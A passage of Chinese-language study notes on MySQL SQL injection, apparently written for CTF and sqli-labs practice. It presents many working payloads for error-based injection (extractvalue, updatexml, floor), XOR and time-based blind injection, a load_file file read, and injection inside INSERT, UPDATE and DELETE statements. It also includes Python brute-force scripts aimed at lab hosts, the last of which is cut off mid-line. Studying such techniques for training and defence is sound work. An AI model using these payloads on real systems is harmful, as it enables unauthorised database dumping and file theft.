<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;and 1=extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())))--+</span><br></pre></td></tr></table></figure>

<p><img src="/.io//image-20250522214828964-1754809764536-27.png" alt="image-20250522214828964"></p>
<p><strong>爆列名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;and 1=extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;emails&#x27;)))--+</span><br><span class="line"></span><br><span class="line">也可以?id=1&#x27;and 1=extractvalue(1,concat(0x7e,substring((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;emails&#x27;),1,50)))--+</span><br><span class="line"></span><br><span class="line">然后1，50换成50，100</span><br></pre></td></tr></table></figure>

<p><img src="/.io//image-20250522214940702-1754809764536-26.png" alt="image-20250522214940702"></p>
<p><strong>爆字段</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;and 1=extractvalue(1,concat(0x7e,(select group_concat(id,&#x27;~&#x27;,email_id) from emails)))--+</span><br><span class="line"></span><br><span class="line">?id=1&#x27;and 1=extractvalue(1,concat(0x7e,(select substring(group_concat(id,&#x27;~&#x27;,email_id),1,15) from emails)))--+</span><br><span class="line">使用函数substring解决只能返回32个字符串问题</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">limit函数</span><br><span class="line">?id=1&#x27;and 1=extractvalue(1,concat(0x7e,substring((select id from emails limit 0,1),1,90),0x7e))--+查询的是第一行的第一条</span><br></pre></td></tr></table></figure>

<p>得到结果</p>
<h4 id="updatexml报错注入"><a href="#updatexml报错注入" class="headerlink" title="updatexml报错注入"></a>updatexml报错注入</h4><p>updatexml（）函数<br>●updatexml（）是一个使用不同的xml标记匹配和替换xml块的函数。<br>●作用：改变文档中符合条件的节点的值<br>●语法： updatexml（XML_document，XPath_string，new_value） 第一个参数：是string格式，为XML文档对象的名称，文中为Doc 第二个参数：代表路径，Xpath格式的字符串例如&#x2F;&#x2F;title【@lang】 第三个参数：string格式，替换查找到的符合条件的数据<br>●updatexml使用时，当xpath_string格式出现错误，mysql则会爆出xpath语法错误（xpath syntax）<br>●例如： select * from test where ide &#x3D; 1 and (updatexml(1,0x7e,3)); 由于0x7e是~，不属于xpath语法格式，因此报出xpath语法错误。</p>
<p>and updatexml(1,payload,1)</p>
<p>同样该语句对输出的字符长度也做了限制，其最长输出32位并且该语句对payload的反悔类型也做了限制，只有在payload返回的不是xml格式才会生效</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">updatexml(xml_doument,XPath_string,new_value)</span><br><span class="line">第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc</span><br><span class="line">第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。</span><br><span class="line">第三个参数：new_value，String格式，替换查找到的符合条件的数据</span><br><span class="line">updatexml(xml_doument,XPath_string,new_value)</span><br><span class="line">第一个参数：XML的内容</span><br><span class="line">第二个参数：是需要update的位置XPATH路径</span><br><span class="line">第三个参数：是更新后的内容</span><br><span class="line">所以第一和第三个参数可以随便写，只需要利用第二个参数，他会校验你输入的内容是否符合XPATH格式</span><br><span class="line"></span><br><span class="line">payload:&#x27; and updatexml(1,version(),1)#</span><br><span class="line">发现了，输入内容不符合xpath语法就报错了，注入利用的就是这一点 </span><br><span class="line">构造payload： &#x27; and updatexml(1,concat(0x7e,version()),1)#</span><br><span class="line">注解上：让全部的数据都校验失败， 恩，就是使用concat在需要的数据前面加上一个XPATH校验失败的东东就可以了0x7e用来校验，version()是我们想要的数据，concat用来连接它们两个 0x7e这个东西，它是 ~ 的16进制用来校验</span><br><span class="line">payload:1&#x27; and updatexml(1,concat(0x7e,database()),0)#，这里是~号</span><br></pre></td></tr></table></figure>

<p><strong>爆数据库名：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;and 1=updatexml(1,concat(0x7e,(select database())),3)--+</span><br></pre></td></tr></table></figure>

<p><strong>爆表名：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;and 1=updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())),3)--+</span><br><span class="line"></span><br><span class="line">回显数据超过1行limit函数limit 0,1, 从表中的第0个数据开始，只读取一个:</span><br><span class="line">?id=1&#x27;and 1=updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database() limit 0,1)),3)--+</span><br></pre></td></tr></table></figure>

<p><strong>爆列名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;and 1=updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;emails&#x27;)),3)--+</span><br></pre></td></tr></table></figure>

<p><strong>爆字段</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/?id=1&#x27;and 1=updatexml(1,concat(0x7e,(select group_concat(id,email_id) from emails)),3)--+</span><br><span class="line"></span><br><span class="line">?id=1&#x27;and 1=updatexml(1,concat(0x7e,mid((select group_concat(id,email_id) from emails),1,31),0x7e),1)--+</span><br><span class="line"></span><br><span class="line">?id=1&#x27;and 1=updatexml(1,concat(0x7e,(select substring(group_concat(id,&#x27;:&#x27;,email_id),30,30) from emails)),3)--+</span><br><span class="line"></span><br><span class="line">/?id=1&#x27;and 1=updatexml(1,concat(0x7e,(select substring(group_concat(id,&#x27;:&#x27;,email_id),1,30) from emails)),3)--+</span><br></pre></td></tr></table></figure>

<h4 id="floor报错注入"><a href="#floor报错注入" class="headerlink" title="floor报错注入"></a><strong>floor报错注入</strong></h4><p>使用floor报错注入，需要确保查询的表必须大于三条数据</p>
<p>payload的大致格式</p>
<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;union select <span class="number">1</span> from (<span class="name">select</span> count(<span class="name">*</span>),concat((<span class="name">slelect</span>语句),floor(<span class="name">rand</span>(<span class="number">0</span>)*2))x from &quot;一个足够大的表&quot; group by x)a--+</span><br></pre></td></tr></table></figure>

<p>本质是因为floor(rand(0)*2)的重复性，导致group by语句出错。</p>
<p>?id&#x3D;1’ order by 4 –+</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27; union select 1,2,count(*),concat_ws(&#x27;-&#x27;,(select group_concat(table_name) from information_schema.tables where table_schema=database()),floor(rand(0)*2)) as a from information_schema.tables group by a--+</span><br></pre></td></tr></table></figure>

<p><img src="/.io//image-20250522225418844-1754809764536-28.png" alt="image-20250522225418844"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">获取数据库</span><br><span class="line">admin&#x27; and (select 1 from (select count(*),concat(0x23,(database()),0x23,floor(rand(0)*2)) as x from information_schema.columns group by x) as y)#</span><br><span class="line"></span><br><span class="line">查表名</span><br><span class="line">admin&#x27; and (select 1 from (select count(*),concat(0x23,(select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),0x23,floor(rand(0)*2)) as x from information_schema.columns group by x) as y)# 可以查到第一个表</span><br><span class="line">同样修改limit语句的参数值从而查询其他的表名</span><br><span class="line">admin&#x27; and (select 1 from (select count(*),concat(0x23,(select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 2,1),0x23,floor(rand(0)*2)) as x from information_schema.columns group by x) as y)# 第二个表 ，其实有时候我们可以使用group_concat()将所以查询内容列出，但是要取决于题目具体环境</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">查列名</span><br><span class="line">之后我们查询指定数据库指定表名下的列名</span><br><span class="line">?id=1&quot; and (select 1 from (select count(*),concat(0x23,(select column_name from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;emails&#x27; limit 0,1),0x23,floor(rand(0)*2)) as x from information_schema.columns group by x) as y)--+</span><br><span class="line">第一列名为 id</span><br><span class="line">继续查下一列的列名</span><br><span class="line">?id=1&quot; and (select 1 from (select count(*),concat(0x23,(select column_name from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;emails&#x27; limit 1,1),0x23,floor(rand(0)*2)) as x from information_schema.columns group by x) as y)--+   得知第二列的列名为 email_id</span><br><span class="line"></span><br><span class="line">查具体字段内容，这里我们查询 email_id 下的内容</span><br><span class="line">?id=1&quot; and (select 1 from (select count(*),concat(0x23,(select email_id from security.emails limit 0,1),0x23,floor(rand(0)*2)) as x from information_schema.columns group by x) as y)--+</span><br><span class="line">查第二行数据</span><br><span class="line">?id=1&quot; and (select 1 from (select count(*),concat(0x23,(select email_id from security.emails limit 1,1),0x23,floor(rand(0)*2)) as x from information_schema.columns group by x) as y)--+</span><br></pre></td></tr></table></figure>

<p>以此类推</p>
<p><img src="/.io//image-20250529214533037-1754809764536-30.png" alt="image-20250529214533037"></p>
<p><img src="/.io//image-20250522225429090-1754809764536-29.png" alt="image-20250522225429090"></p>
<p>另一个题</p>
<p><img src="/.io//image-20250522225925412-1754809764536-31.png" alt="image-20250522225925412"></p>
<p><img src="/.io//image-20250522225932834-1754809764536-32.png" alt="image-20250522225932834"></p>
<h4 id="万能payload"><a href="#万能payload" class="headerlink" title="万能payload"></a>万能payload</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and updatexml(1,concat(0x7e,去掉union的联合注入payload,0x7e),1)%23</span><br></pre></td></tr></table></figure>

<p>爆出数据库及相关信息(and or均可)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and updatexml(1,concat(0x7e,select database(),0x7e,user(),0x7e,@@datadir),1)%23</span><br><span class="line">或者简单一点只看数据库</span><br><span class="line">1&#x27; and updatexml(1,concat(0x7e,select database(),0x7e),1)%23</span><br></pre></td></tr></table></figure>

<p>爆出表名（无空格的payload）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)=(database())),0x7e),1))%23</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&quot;||extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database()))))%23</span><br></pre></td></tr></table></figure>

<p>爆出字段名（无空格的payload）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)=(&#x27;刚刚的表名&#x27;)),0x7e),1))%23</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&quot;||extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;flag&#x27;))))%23</span><br></pre></td></tr></table></figure>

<p>爆出字段内容（无空格的payload）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(字段名))from(表名)),0x7e),1))%23</span><br></pre></td></tr></table></figure>

<h4 id="报错注入可以读文件"><a href="#报错注入可以读文件" class="headerlink" title="报错注入可以读文件"></a><strong>报错注入可以读文件</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;or(updatexml(1,concat(0x7e,(select(substr(load_file(&#x27;/flag.txt&#x27;),1,30))),0x7e),1))%23</span><br></pre></td></tr></table></figure>

<h4 id="长度限制"><a href="#长度限制" class="headerlink" title="长度限制"></a><strong>长度限制</strong></h4><p>因为报错注入对报错出的内容有长度限制，所以我们用left()right()语句分别查询，然后再进行flag的拼接。<br>比如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(right(字段名,25)))from(表名)),0x7e),1))%23</span><br></pre></td></tr></table></figure>

<p>reverse倒转输出，可以把字符串到过来输出。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aaa&quot;or(updatexml(1,(reverse(concat(0x3a,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#x27;^f&#x27;))))),1))#</span><br></pre></td></tr></table></figure>

<p>mid,substr,left,right字符串截取函数</p>
<h4 id="基于insert的报错注入："><a href="#基于insert的报错注入：" class="headerlink" title="基于insert的报错注入："></a><strong>基于insert的报错注入：</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into goods (name,num) values(&quot;ceshi&quot; or updatexml(1,concat(0x7e,database()),0) and &quot;1&quot;,34);</span><br></pre></td></tr></table></figure>

<h4 id="基于delete的报错注入"><a href="#基于delete的报错注入" class="headerlink" title="基于delete的报错注入"></a><strong>基于delete的报错注入</strong></h4><p>delete from users where id &#x3D;2<br>delete from user where id &#x3D;2 or<br>updatexml(1,concat(0x7e,database(),0))</p>
<h3 id="异或盲注"><a href="#异或盲注" class="headerlink" title="异或盲注"></a><strong>异或盲注</strong></h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/SoporAeternus12/article/details/124001820">sql注入漏洞之异或注入_sql异或注入-CSDN博客</a></p>
<p>在做string和数字型的值比较的时候，string会转换成数字，对于前面是数字的字符串，转换的时候就是转换成前面的数字，而前面不是以数字开头的字符串，转换的时候自然就是转换成0了，可以再看看下面两个例子。</p>
<p>‘aaa’&#x3D;&gt;0;</p>
<p>‘12aaa’&#x3D;&gt;12;</p>
<p>首先’李勇’^1做异或运算，结果会是1，因为该字符串转换成数字就是0，然后看看Sname&#x3D;0这个表达式，我们不妨把每个元组都拿过来一个一个比较，每个元组的Sname转换成数字都是0，所以对于每个元组，该where后面的判断条件全部都是成立的，而Sname&#x3D;1这个表达式自然就是都不成立。</p>
<p>异或注入可以配合其他语句使用，例如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; or 1=0^(ascii(substr((select(group_concat(flag))from(flag)),1,1))&gt;0)--+</span><br></pre></td></tr></table></figure>

<p><strong>如何利用异或运算来进行注入？</strong></p>
<p>我们可以构造一条这样的sql语句</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * <span class="keyword">from</span> student where <span class="title class_">Sname</span>=<span class="string">&#x27;李勇&#x27;</span>^(<span class="title function_">length</span>(<span class="title function_">database</span>())!=$变量$);</span><br></pre></td></tr></table></figure>

<p>通过构造这样类似的sql语句就可以得到当前数据库名的长度，也可以将语句稍微改改，通过脚本爆破出数据库名表名等，这里我就不演示太多了。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#查询数据库名</span><br><span class="line">mysql&gt; select * <span class="keyword">from</span> student where <span class="title class_">Sname</span>=<span class="string">&#x27;李勇&#x27;</span>^(<span class="title function_">substr</span>(<span class="title function_">database</span>(),$变量<span class="number">1</span>$,<span class="number">1</span>)!=$变量<span class="number">2</span>$);</span><br><span class="line"></span><br><span class="line">#查询表名</span><br><span class="line">mysql&gt; select * <span class="keyword">from</span> student where <span class="title class_">Sname</span>=<span class="string">&#x27;李勇&#x27;</span>^(<span class="title function_">substr</span>((select table_name <span class="keyword">from</span> information_schema.<span class="property">tables</span> where table_schema=<span class="title function_">database</span>() limit $变量<span class="number">1</span>$,<span class="number">1</span>),$变量<span class="number">2</span>$,<span class="number">1</span>)!=$变量<span class="number">3</span>$);</span><br></pre></td></tr></table></figure>

<h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><p>case …… when……<br>if()<br>elt()</p>
<p><strong>时间函数：</strong></p>
<p>benchmark(count,expr)会重复计算expr表达式count次，通过这种方式就可以评估出mysql执行这个expr表达式的效率。这个函数的返回值始终是0，但可以根据客户端提示的执行时间来得到BENCHMARK总共执行的所消耗的时间。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(1,benchmark(10000000,sha(1)),1)</span><br></pre></td></tr></table></figure>

<p>RLIKE</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select rpad(&#x27;a&#x27;,4999999,&#x27;a&#x27;) RLIKE concat(repeat(&#x27;(a.*)+&#x27;,30),&#x27;b&#x27;)</span><br></pre></td></tr></table></figure>

<p>做笛卡尔积</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT count(*) FROM information_schema.columns A,information_schema.tables B;</span><br><span class="line"></span><br><span class="line">select if(1,(SELECT count(*) FROM information_schema.columns A,information_schema.tables B),1);</span><br></pre></td></tr></table></figure>

<p>sleep(time)：time单位：秒<br>sleep函数本身就可以充当if：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sleep(5*(ascii(substr((select database()),1,1))&gt;1))</span><br></pre></td></tr></table></figure>

<p><strong>基于insert的时间盲注：</strong></p>
<p>insert into goods values(5,”xiaoming”,34);<br>对xiaoming部分进行注入：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload: 3&quot;+sleep(3)+&quot;3</span><br><span class="line">或者3&quot; and sleep(6) or &quot;3</span><br></pre></td></tr></table></figure>

<p><strong>基于update的时间盲注：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update goods set name=1 and sleep(3) where id =1;</span><br></pre></td></tr></table></figure>

<p>update和REGEXP进行时间盲注</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">url = &#x27;http://challenge.basectf.fun:32425&#x27;</span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line">strings = &#x27;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_-abcdefghijklmnopqrstuvwxyz&#123;&#125;&#x27;</span><br><span class="line">for i in range(1, 100):</span><br><span class="line">        for char in strings:</span><br><span class="line">            payload=&quot;UPDATE flag SET id = &#x27;fffffilm&#x27; WHERE data REGEXP &#x27;^Basectf&#x27; AND IF(data REGEXP &#x27;^&#123;&#125;&#x27;,sleep(1), 1)&quot;.format((flag+char))</span><br><span class="line">            params=&#123;</span><br><span class="line">                &quot;sql&quot;:payload</span><br><span class="line">            &#125;</span><br><span class="line">            print(payload)</span><br><span class="line">            time.sleep(0.05)</span><br><span class="line">            start_time = time.time()</span><br><span class="line">            rs = requests.get(url,params=params)</span><br><span class="line">            end_time = time.time()</span><br><span class="line">            if end_time - start_time &gt; 1:</span><br><span class="line">                flag += char</span><br><span class="line">                print(flag)</span><br><span class="line">                break</span><br></pre></td></tr></table></figure>

<p><strong>基于delete的时间盲注：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">delete from user where id =2 or sleep(3);</span><br></pre></td></tr></table></figure>

<p>对30s延时的原理的猜测：<br>mysql 会从goods表的第一行还是比对id是不是等于12 ，如果不是等于12，那么就会执行sleep(3) ，所以大约有10条数据id不等于12(id&#x3D;6之前被我删除了所以有10条)，sleep(3)*10 &#x3D; 30sec</p>
<p><img src="/.io//image-20250604205014431-1754809764536-33.png" alt="image-20250604205014431"></p>
<p>所以如果是用and连接的话只会执行一次。<br>利用delete from flag where data like ‘f%’ and sleep(5)来进行注入，如果like成功匹配到，and字段会对后面的语句进行处理，如果like匹配不到（返回false）and后语句则不会进行处理，因为sleep()函数返回值为null，因此整个where的判断永假</p>
<p><strong>题目</strong></p>
<p>sql第9关不管输入什么页面显示的东西都是一样的，这个时候布尔盲注就不适合我们用，布尔盲注适合页面对于错误和正确结果有不同反应。如果页面一直不变这个时候我们可以使用时间注入</p>
<p>时间注入和布尔盲注两种没有多大差别只不过时间盲注多了if函数和sleep()函数。if(a,sleep(10),1)如果a结果是真的，那么执行sleep(10)页面延迟10秒，如果a的结果是假，执行1，页面不延迟。通过页面时间来判断出id参数是单引号字符串。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and if(1=1,sleep(10),1)--+</span><br></pre></td></tr></table></figure>

<p>判断完闭合用exp</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><span class="line"># coding:utf-8</span><br><span class="line">import requests</span><br><span class="line">import datetime</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">k控制着limit</span><br><span class="line">i控制着substr</span><br><span class="line">j控制着所猜字符的ascii</span><br><span class="line"></span><br><span class="line">payload :</span><br><span class="line">    单引号盲注：</span><br><span class="line">        猜数据库长度：</span><br><span class="line">        payload = &quot;?id=1&#x27; and if(length(database())&gt;%s,sleep(2),0) --+&quot; %i</span><br><span class="line">        猜数据库名字：</span><br><span class="line">        payload = &quot;?id=1&#x27; and if(substr(database(),%d,1)=&#x27;%s&#x27;,sleep(3),1) --+&quot; % (i,j)</span><br><span class="line">        猜表名：</span><br><span class="line">        payload = &quot;?id=1&#x27; and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit %d,1),%d,1))=%d,sleep(3),0) --+&quot; % (k, i, j)</span><br><span class="line">        猜列名：</span><br><span class="line">        payload = &quot;?id=1&#x27; and if(ascii(substr((select column_name from information_schema.columns where table_name=&#x27;%s&#x27; and table_schema=database() limit %d,1),%d,1))=%d,sleep(3),0) --+&quot; % (table_name, k, i, j)</span><br><span class="line">        爆数据：</span><br><span class="line">        payload = &quot;?id=1&#x27; and if(ascii(substr((select %s from %s limit %d,1),%d,1))=%d, sleep(2),0)--+&quot; % (column,table,k,i,j)</span><br><span class="line"></span><br><span class="line">    双引号盲注：</span><br><span class="line">        猜数据库长度：</span><br><span class="line">        payload = &#x27;?id=1&quot; and if(length(database())&gt;%s,sleep(2),0) --+&#x27; %i</span><br><span class="line">        猜数据库名字：</span><br><span class="line">        payload = &#x27;?id=1&quot; and if(substr(database(),%d,1)=&quot;%s&quot;,sleep(3),1) --+&#x27; % (i,j)</span><br><span class="line">        猜表名：</span><br><span class="line">        payload = &#x27;?id=1&quot; and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit %d,1),%d,1))=%d,sleep(3),0) --+&#x27; % (k, i, j)</span><br><span class="line">        猜列名：</span><br><span class="line">        payload = &#x27;?id=1&quot; and if(ascii(substr((select column_name from information_schema.columns where table_name=&quot;%s&quot; and table_schema=database() limit %d,1),%d,1))=%d,sleep(3),0) --+&#x27; % (table_name, k, i, j)</span><br><span class="line">        爆数据：</span><br><span class="line">        payload = &#x27;?id=1&quot; and if(ascii(substr((select %s from %s limit %d,1),%d,1))=%d, sleep(2),0)--+&#x27; % (column,table,k,i,j)</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">url = &#x27;http://8.130.67.146:8081/Less-8/&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def database_len():</span><br><span class="line">    for i in range(1, 15):</span><br><span class="line"></span><br><span class="line">        #payload = &#x27;?id=1&quot; and if(length(database())&gt;%s,sleep(2),0) --+&#x27; % i</span><br><span class="line">        payload = &quot;?id=1&#x27; and if(length(database())&gt;%s,sleep(2),0) --+&quot; 